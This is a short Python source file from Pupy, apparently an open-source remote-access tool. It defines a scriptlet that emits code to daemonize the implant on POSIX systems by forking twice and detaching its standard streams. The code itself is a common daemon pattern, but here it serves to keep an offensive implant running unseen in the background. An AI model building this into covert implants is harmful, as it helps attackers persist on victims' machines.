#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import textwrap, random, string
from scriptlets import *

class ScriptletGenerator(Scriptlet):
    """ daemonize the process at startup (posix only) """

    dependencies=[]
    arguments={
    }

    def __init__(self):
        pass

    def generate(self):
        return textwrap.dedent("""
        import pupy, os

        if os.name == 'posix':
            pupy.infos['daemonize']=True
            if os.fork():   # launch child and...
                os._exit(0) # kill off parent
            os.setsid()
            if os.fork():   # launch child and...
                os._exit(0) # kill off parent again.
            os.umask(022)   # Don't allow others to write
            null=os.open('/dev/null', os.O_RDWR)
            for i in range(3):
                try:
                    os.dup2(null, i)
                except OSError, e:
                    if e.errno != errno.EBADF:
                        raise
            os.close(null)
        """)


